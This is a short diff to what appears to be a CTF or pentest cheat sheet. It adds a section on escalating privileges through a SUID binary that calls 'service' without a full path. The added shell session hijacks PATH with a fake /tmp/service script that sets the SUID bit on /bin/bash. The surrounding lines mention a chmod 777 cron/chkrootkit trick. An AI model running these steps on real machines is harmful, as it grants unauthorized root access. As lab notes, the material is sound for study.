@@ -700,6 +700,16 @@ chmod 777 /tmp/update
 # execute the chkrootkit command for a cron job
 ```
 
+### SUID personal binary 
+```bash
+jose@midnight:~$ strings /usr/bin/status | grep service		# binary status execute service command
+service ssh status
+jose@midnight:~$ export PATH=/tmp/:$PATH
+jose@midnight:/tmp$ echo "chmod u+s /bin/bash" > service
+jose@midnight:/tmp$ chmod +x service
+jose@midnight:/tmp$ /usr/bin/status
+```
+	
 ### Cipher
 https://www.dcode.fr/cipher-identifier
 
